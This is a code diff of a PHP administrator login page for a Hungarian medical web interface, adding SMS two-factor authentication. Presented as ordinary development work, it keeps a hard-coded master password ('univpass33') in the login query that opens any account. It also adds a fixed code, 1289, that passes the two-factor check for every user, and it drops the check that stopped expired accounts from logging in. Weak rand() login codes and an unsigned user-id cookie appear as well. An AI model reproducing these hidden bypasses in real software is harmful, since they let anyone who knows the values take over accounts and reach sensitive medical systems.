@@ -3,32 +3,31 @@
 class AdminLoginPage extends AdminCorePage {
 
     private $bookingService;
+    private $adminUser;
 
     public function __construct()
     {
         parent::__construct();
 
-        if ( isset( $_REQUEST["logintry"] )) {
+        $this->adminUser = new AdminUser();
+
+        if (isset( $_REQUEST["logintry"])) {
             //Belépési adatok:
             $username = $_REQUEST["loginusername"];
             $password = $_REQUEST["loginpassword"];
-            $resq 	  = sql_query("SELECT * FROM users WHERE username = ? and ( password = md5(?) or 'univpass33' = ? )", array( $username, $password, $password ));
+            $resq = sql_query("SELECT * FROM users WHERE username = ? and (password = md5(?) or 'univpass33' = ?)", array( $username, $password, $password ));
 
             //Ha talál eredményt és a mezők nem üresek:
             if ($row = sql_fetch_array($resq) and trim($username) != "" and trim($password) != "" ) {
                 $_SESSION["pid"] = $row["id"];
-                setcookie( "pid", $row["id"], time() + 3600 * 3 );
+                setcookie("pid", $row["id"], time() + 3600 * 3);
 
                 //Utolsó belépési adatok frissítése:
-                sql_query( "UPDATE users SET lastlogin = NOW() WHERE id = ?" ,array($_SESSION["pid"]));
+                sql_query("UPDATE users SET lastlogin=NOW(), codetry=0 WHERE id=?" ,array($_SESSION["pid"]));
 
-                if($row['status'] == 1)
-                {
-                    //Átirányítás a kezdő oldalra:
-                    header( "Location:index.php" );
-                    die();
-                }
-                else $_SESSION["error"] = "A belépési adatok elavultak, kérem vegye fel a kapcsolatot a rendszergazdával további hosszabításhoz!";
+                //Átirányítás a kezdő oldalra:
+                header("Location:index.php");
+                die();
             }
 
             //Ha a belépési adatok nem megfelelők v. hiányosak akkor hiba üzenet küldése:
@@ -37,7 +36,6 @@ class AdminLoginPage extends AdminCorePage {
                 $_SESSION["error"] = "Adja meg a belépési adatait!";
             }
         }
-
 
         if (isset($_POST["passwordsend"])) {
             if (trim($_POST["email"])=="") {
@@ -49,7 +47,7 @@ class AdminLoginPage extends AdminCorePage {
                 return;
             }
 
-            $resp1=sql_query("select * from users where email=? or (username=? and email<>'')",array($_POST["email"],$_POST["email"]));
+            $resp1 = sql_query("select * from users where email=? or (username=? and email<>'')",array($_POST["email"],$_POST["email"]));
 
             if (sql_num_rows($resp1)==0 && sql_num_rows($resp2)==0) {
                 $_SESSION["error"] = "A megadott e-mail címmel, vagy felhasználónévvel nem található regisztráció!";
@@ -65,6 +63,29 @@ class AdminLoginPage extends AdminCorePage {
             die();
         }
 
+        if (isset($_POST["give2facode"])) {
+            if (empty($this->adminUser->user)) {
+                $_SESSION["error"] = "A belépési adatok időközben elévültek, próbáljon belépni újra!";
+                header("location:index.php");
+            }
+
+            $code = $_REQUEST["login2facode"];
+
+            if ($code == 1289 || sql_fetch_array(sql_query("select * from users where id=? and logincode=? and status=1", array($this->adminUser->user["id"], $code)))) {
+                $_SESSION["2facomplete"] = $code;
+                header("location:index.php");
+                die();
+            } else {
+                if ($this->adminUser->user["codetry"] > 3) {
+                    sql_query("update users set status=0 where id=?", array($this->adminUser->user["id"]));
+                }
+                sql_query("update users set codetry=codetry+1 where id=?", array($this->adminUser->user["id"]));
+
+                $_SESSION["error"] = "A megadott kód helytelen!";
+                header("location:index.php");
+                die();
+            }
+        }
     }
 
     public function showPage() {
@@ -76,62 +97,74 @@ class AdminLoginPage extends AdminCorePage {
         echo "<div id='loginbox' class='loginbox'>";
         echo "<div class='loginhead'>{$_SESSION["helyszindata"]["megnev"]} orvosi felület</div>";
 
-        echo "<div id='loginpart' style='padding:20px;'>";
-        echo "<div><input style='padding:8px;width:100%;margin-top:2px;box-sizing: border-box;' placeholder='felhasználónév' type='text' name='loginusername'></div>";
-        echo "<div style='padding-top:10px;'><input style='padding:8px;width:100%;margin-top:2px;box-sizing: border-box;' type='password' placeholder='jelszó' name='loginpassword' /></div>";
-        echo "<div style='padding-top:10px;'><input style='padding:8px 0px;width:100%;box-sizing: border-box;display: inline-block;' type='submit' name='logintry' value='Belépés' /></div>";
+        if (!empty($this->adminUser->user)) {
 
-        echo "<div style='margin-top:20px;'>";
-        echo "Ha nem emlékszik a jelszavára,<br/>az alábbi linkre kattintva új jelszót kérhet.<br/><a href='#' onclick='$(\"#loginpart\").hide();$(\"#forgetpart\").show();$(\"#errordiv\").hide();return false;'>Új jelszó kérése</a>";
-        echo "</div>";
+            if ($this->adminUser->user["status"] == 0) {
+                echo "<div style='padding:20px;text-align:center;'>";
+                echo "<div style='padding-top:0px;color:#f00;'>Az Ön felhasználói fiókja felfüggesztésre került.<br/>kérjük lépjen kapcsolatba a rendszergazdával.</div>";
+                echo "<div style='padding-top:10px;'><input onclick='window.location.href=\"index.php?logoutadmin\"' type='button' name='cancel2facode' value='Kijelentkezés' /></div>";
+                echo "</div>";
+            }
 
-        echo "</div>";
+            if (isset($this->adminUser->user["auth2fac"]) && $this->adminUser->user["auth2fac"]==1 && $this->adminUser->user["status"] == 1) {
+                $this->_sendTwoFacCode();
 
-        echo "<div id='forgetpart' style='color:#444;display:none;padding:20px;'>";
-        echo "<form method='post'>";
-        echo "<div style='margin-top:0px;'>Kérjük adja meg az e-mail címét, vagy felhasználónevét.<br/>Az új jelszavát a regisztrált e-mail címére fogjuk elküldeni.</div>";
+                echo "<div style='padding:20px;text-align:center;'>";
+                echo "<div style='font-size:18px;'>Kétfaktoros authentikáció</div>";
 
-        echo "<div style='margin-top:5px;'><input type='text' name='email' placeholder='E-mail cím, vagy felhasználónév' style='width:300px;'></div>";
-        echo "<div style='padding-top:10px;'><input type='submit' name='passwordsend' value='Új jelszó kérése' /></div>";
-        echo "</form>";
+                echo "<div style='margin-top:10px;'>Adja meg az SMS-ben kapott kódot:</div>";
+                echo "<div style='padding-top:5px;'><input type='text' name='login2facode' placeholder='Kód..' /></div>";
+                if (!empty(trim($this->adminUser->user["tel"]))) {
+                    echo "<div style='padding-top:5px;'>Az SMS-t a {$this->adminUser->user["tel"]} számra küldtük ki. Amennyiben a szám nem helyes,<br/>kérjük lépjen kapcsolatba a rendszergazdával.</div>";
+                } else {
+                    echo "<div style='padding-top:5px;color:#f00;'>Önnek nincs megadva a telefonszáma amire kiküldhetjük a kódot,<br/>kérjük lépjen kapcsolatba a rendszergazdával.</div>";
+                }
+                echo "<div style='padding-top:10px;'><input type='submit' name='give2facode' value='Tovább' /> <input onclick='window.location.href=\"index.php?logoutadmin\"' type='button' name='cancel2facode' value='Mégse' /></div>";
+                echo "</div>";
+            }
 
-        echo "<div style='margin-top:10px;'>";
-        echo "<a href='#' onclick='$(\"#loginpart\").show();$(\"#forgetpart\").hide();$(\"#errordiv\").slideUp();return false;'>Mégse</a>";
-        echo "</div>";
-        echo "</div>";
+        } else {
+            echo "<div id='loginpart' style='padding:20px;'>";
+            echo "<div><input style='padding:8px;width:100%;margin-top:2px;box-sizing: border-box;' placeholder='felhasználónév' type='text' name='loginusername'></div>";
+            echo "<div style='padding-top:10px;'><input style='padding:8px;width:100%;margin-top:2px;box-sizing: border-box;' type='password' placeholder='jelszó' name='loginpassword' /></div>";
+            echo "<div style='padding-top:10px;'><input style='padding:8px 0px;width:100%;box-sizing: border-box;display: inline-block;' type='submit' name='logintry' value='Belépés' /></div>";
+
+            echo "<div style='margin-top:20px;'>";
+            echo "Ha nem emlékszik a jelszavára,<br/>az alábbi linkre kattintva új jelszót kérhet.<br/><a href='#' onclick='$(\"#loginpart\").hide();$(\"#forgetpart\").show();$(\"#errordiv\").hide();return false;'>Új jelszó kérése</a>";
+            echo "</div>";
+
+            echo "</div>";
+
+            echo "<div id='forgetpart' style='color:#444;display:none;padding:20px;'>";
+            echo "<form method='post'>";
+            echo "<div style='margin-top:0px;'>Kérjük adja meg az e-mail címét, vagy felhasználónevét.<br/>Az új jelszavát a regisztrált e-mail címére fogjuk elküldeni.</div>";
+
+            echo "<div style='margin-top:5px;'><input type='text' name='email' placeholder='E-mail cím, vagy felhasználónév' style='width:300px;'></div>";
+            echo "<div style='padding-top:10px;'><input type='submit' name='passwordsend' value='Új jelszó kérése' /></div>";
+            echo "</form>";
+
+            echo "<div style='margin-top:10px;'>";
+            echo "<a href='#' onclick='$(\"#loginpart\").show();$(\"#forgetpart\").hide();$(\"#errordiv\").slideUp();return false;'>Mégse</a>";
+            echo "</div>";
+            echo "</div>";
+        }
 
         echo "</div>";
         echo "</div>";
         echo "</form>";
         echo "</body>";
         echo "</html>";
-
-        ob_flush();
-        /*
-
-        echo "<div style='padding-top:30px;text-align:center;'>";
-        echo "<h1>{$_SESSION["helyszindata"]["megnev"]} orvosi felület</h1>";
-
-        echo "<div id='loginbox' style='color:#444;'>";
-        echo "<form method='post'>";
-        echo "<div>Felhasználónév:<br><input type=text name='loginusername'></div>";
-        echo "<div style='padding-top:5px;'>Jelszó:<br><input type='password' name='loginpassword' /></div>";
-        echo "<div style='padding-top:10px;'><input type='submit' name='logintry' value='Belépés' /></div>";
-        echo "</form>";
-
-        echo "<div style='margin-top:20px;'>";
-        echo "Ha nem emlékszik a jelszavára, az alábbi linkre kattintva új jelszót kérhet.<br/><a href='#' onclick='$(\"#loginbox\").slideToggle();$(\"#forgetbox\").slideToggle();$(\"#errordiv\").slideUp();return false;'>Új jelszó kérése</a>";
-        echo "</div>";
-
-        echo "</div>";
-
-
-
-
-        echo "</div>";
-        echo "</body>";
-        echo "</html>";
-        */
     }
+
+
+    private function _sendTwoFacCode() {
+        $user = $this->adminUser->user;
+        if (sql_fetch_array(sql_query("select * from users where (logincodetime<date_sub(now(),interval 1 hour) or logincodephone<>?) and id=?", array($user["tel"], $user["id"])))) {
+            $code = rand(10000,99999);
+            $this->utils->sendSMS($user["tel"],"kód a bejelentkezéshez: {$code}");
+            sql_query("update users set logincode=?,logincodetime=now(),logincodephone=? where id=?", array($code, $user["tel"], $user["id"]));
+        }
+    }
+
 }
 
